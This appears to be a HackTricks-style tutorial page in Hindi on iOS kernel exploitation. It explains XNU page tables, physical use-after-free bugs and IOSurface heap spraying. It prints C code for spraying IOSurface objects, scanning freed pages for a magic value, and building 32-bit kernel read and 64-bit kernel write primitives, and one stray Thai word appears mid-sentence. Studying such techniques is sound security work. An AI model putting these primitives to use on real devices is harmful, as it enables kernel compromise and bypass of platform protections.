# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

यह सार [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) पोस्ट से लिया गया है; इस तकनीक का उपयोग करके exploit के बारे में अतिरिक्त जानकारी [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd) में मिलती है।

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

iOS पर user processes के लिए **virtual memory address space** **0x0 से 0x8000000000** तक फैला होता है। हालांकि, ये एड्रेसेस सीधे physical memory से मैप नहीं होते। इसके बजाय, **कर्नेल** virtual एड्रेस को वास्तविक **physical addresses** में translate करने के लिए **page tables** का उपयोग करता है।

#### Levels of Page Tables in iOS

Page tables तीन स्तरों में व्यवस्थित होते हैं:

1. **L1 Page Table (Level 1)**:
* यहाँ हर entry वर्चुअल मेमोरी के बड़े रेंज का प्रतिनिधित्व करती है।
* यह **0x1000000000 bytes** (या **256 GB**) वर्चुअल मेमोरी को कवर करती है।
2. **L2 Page Table (Level 2)**:
* यहाँ की एक entry वर्चुअल मेमोरी के छोटे क्षेत्र का प्रतिनिधित्व करती है, विशेषकर **0x2000000 bytes** (32 MB)।
* यदि कोई L1 entry पूरे क्षेत्र को खुद नहीं मैप कर सकती तो वह किसी L2 table की ओर pointer कर सकती है।
3. **L3 Page Table (Level 3)**:
* यह सबसेละเอียด स्तर है, जहाँ हर entry एक single **4 KB** मेमोरी पेज को मैप करती है।
* आवश्यकता होने पर L2 entry किसी L3 table की ओर pointer कर सकती है।

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* page table की कुछ entries सीधे किसी वर्चुअल एड्रेस रेंज को contiguous physical address रेंज से मैप करती हैं (एक तरह का शॉर्टकट)।
* **Pointer to Child Page Table**:
* यदि अधिक सूक्ष्म नियंत्रण की ज़रूरत हो, तो एक स्तर की entry (जैसे L1) अगले स्तर में किसी **child page table** की ओर pointer कर सकती है (जैसे L2)।

#### Example: Mapping a Virtual Address

मान लीजिए आप virtual address **0x1000000000** तक पहुँचने की कोशिश करते हैं:

1. **L1 Table**:
* कर्नेल उस virtual address से संबंधित L1 page table entry को चेक करता है। यदि उसमें **pointer to an L2 page table** है, तो वह उस L2 table पर जाता है।
2. **L2 Table**:
* कर्नेल अधिक विस्तृत मैपिंग के लिए L2 page table को चेक करता है। यदि इस entry में **pointer to an L3 page table** है, तो वह वहां जाता है।
3. **L3 Table**:
* कर्नेल अंतिम L3 entry को देखता है, जो वास्तविक मेमोरी पेज के **physical address** की ओर इशारा करती है।

#### Example of Address Mapping

यदि आप L2 table के पहले index में physical address **0x800004000** लिखते हैं, तो:

* Virtual addresses **0x1000000000** से **0x1002000000** तक physical addresses **0x800004000** से **0x802004000** तक मैप होंगे।
* यह L2 स्तर पर एक **block mapping** है।

वैकल्पिक रूप से, यदि L2 entry किसी L3 table की ओर pointer करती है:

* तो वर्चुअल रेंज **0x1000000000 -> 0x1002000000** के हर 4 KB पेज को L3 table की व्यक्तिगत entries मैप करेंगी।

### Physical use-after-free

एक **physical use-after-free (UAF)** तब होती है जब:

1. कोई process कुछ मेमोरी **readable और writable** के रूप में **allocate** करता है।
2. उस मेमोरी को process द्वारा एक्सेस करने योग्य एक specific physical address से मैप करने के लिए **page tables** अपडेट होते हैं।
3. Process उस मेमोरी को **deallocate** (free) कर देता है।
4. लेकिन किसी **बग** के कारण, कर्नेल **page tables से mapping हटाना भूल जाता है**, जबकि संबंधित physical memory को free के रूप में मार्क कर दिया गया होता है।
5. कर्नेल फिर इस "freed" physical memory को अन्य प्रयोजनों के लिए **reallocate** कर सकता है, जैसे कि **kernel data**।
6. चूंकि mapping नहीं हटाई गई थी, process अभी भी इस physical memory को **read और write** कर सकता है।

इसका अर्थ है कि process **kernel memory के पेजों तक पहुँच** बना सकता है, जिनमें संवेदनशील डेटा या संरचनाएँ हो सकती हैं, जिससे attacker को **kernel memory में छेड़छाड़** करने का मौका मिल सकता है।

### IOSurface Heap Spray

क्योंकि attacker यह नियंत्रित नहीं कर सकता कि किस specific kernel पेज को freed memory के लिए allocate किया जाएगा, वे एक तकनीक का उपयोग करते हैं जिसे कहा जाता है **heap spray**:

1. attacker kernel memory में कई **IOSurface objects** बनाता है।
2. प्रत्येक IOSurface object अपनी किसी field में एक **magic value** रखता है, जिससे उसे आसानी से पहचानना संभव होता है।
3. वे freed पेजों को **scan** करते हैं यह देखने के लिए कि क्या कोई IOSurface object किसी freed पेज पर आ गया है।
4. जब उन्हें किसी freed पेज पर IOSurface object मिलता है, तो वे इसे kernel memory को **read और write** करने के लिए उपयोग कर सकते हैं।

इसके बारे में अधिक जानकारी हेतु देखें: [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> ध्यान दें कि iOS 16+ (A12+) डिवाइस हार्डवेयर mitigations (जैसे PPL या SPTM) लाते हैं जो physical UAF तकनीकों को काफी कम प्रभावी बनाते हैं।
> PPL उन पेजों पर सख्त MMU protections लागू करता है जो code signing, entitlements, और संवेदनशील kernel डेटा से संबंधित हैं, तो भले ही कोई पेज reuse हो जाए, userland या compromised kernel code से PPL-protected पेजों पर writes रोके जाते हैं।
> Secure Page Table Monitor (SPTM) PPL को बढ़ाता है और page table updates को भी मजबूत करता है। यह सुनिश्चित करता है कि privileges वाले kernel code द्वारा freed पेजों को चुपके से remap या mappings में छेड़छाड़ नहीं की जा सके बिना secure checks के।
> KTRR (Kernel Text Read-Only Region) बूट के बाद kernel के code सेक्शन को read-only लॉक कर देता है। यह runtime के दौरान kernel code में किसी भी परिवर्तन को रोकता है, जो physical UAF exploits का एक प्रमुख attack vector होता है।
> इसके अलावा, `IOSurface` allocations अब कम predictable हैं और user-accessible regions में map करना कठिन है, जिससे “magic value scanning” ट्रिक कम भरोसेमंद हो जाती है। और `IOSurface` अब entitlements और sandbox restrictions से guarded है।

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: attacker कई IOSurface objects बनाते हैं जिनमें एक विशेष पहचानकर्ता ("magic value") होता है।
2. **Scan Freed Pages**: वे यह चेक करते हैं कि क्या इनमें से कोई object किसी freed पेज पर allocate हुआ है।
3. **Read/Write Kernel Memory**: IOSurface object की fields में बदलाव करके वे kernel memory में **arbitrary reads और writes** करने की क्षमता हासिल कर लेते हैं। इससे वे कर पाते हैं:
* एक field का उपयोग करके kernel memory में किसी भी 32-bit मान को **read** करना।
* दूसरे field का उपयोग करके 64-bit मान **write** करना, जिससे स्थिर **kernel read/write primitive** मिलती है।

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
एक मुक्त भौतिक पृष्ठ में **`IOSurface`** ऑब्जेक्ट्स खोजें:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface के साथ Kernel Read/Write प्राप्त करना

Kernel memory में एक IOSurface object पर नियंत्रण मिलने के बाद (जो userspace से पहुंच योग्य freed physical page पर mapped होता है), हम इसे arbitrary kernel read और write operations के लिए उपयोग कर सकते हैं।

**IOSurface में मुख्य फील्ड**

IOSurface object में दो महत्वपूर्ण फील्ड हैं:

1. **Use Count Pointer**: एक **32-bit read** की अनुमति देता है।
2. **Indexed Timestamp Pointer**: एक **64-bit write** की अनुमति देता है।

इन pointers को overwrite करके हम इन्हें kernel memory के arbitrary addresses पर redirect कर सकते हैं, जिससे read/write क्षमताएँ सक्षम हो जाती हैं।

#### 32-Bit Kernel Read

पढ़ने के लिए:

1. Overwrite the **use count pointer** ताकि वह target address minus 0x14-बाइट offset को point करे।
2. उस address पर मान पढ़ने के लिए `get_use_count` method का उपयोग करें।
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

लिखने के लिए:

1. **indexed timestamp pointer** को लक्षित पते पर ओवरराइट करें।
2. `set_indexed_timestamp` method का उपयोग करके 64-bit मान लिखें।
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Free pages पुन: उपयोग के लिए उपलब्ध हो जाती हैं।
2. **Spray IOSurface Objects**: kernel memory में एक unique "magic value" के साथ कई IOSurface objects allocate करें।
3. **Identify Accessible IOSurface**: अपने नियंत्रित freed page पर मौजूद IOSurface को पहचानें।
4. **Abuse Use-After-Free**: IOSurface object में pointers को modify करें ताकि IOSurface methods के माध्यम से arbitrary **kernel read/write** सक्षम हो सकें।

इन primitives के साथ, exploit नियंत्रित **32-bit reads** और **64-bit writes** kernel memory में प्रदान करता है। आगे के jailbreak चरणों में अधिक स्थिर read/write primitives शामिल हो सकते हैं, जिनके लिए अतिरिक्त सुरक्षा उपायों को बायपास करना पड़ सकता है (उदा., PPL on newer arm64e devices).

{{#include ../../banners/hacktricks-training.md}}
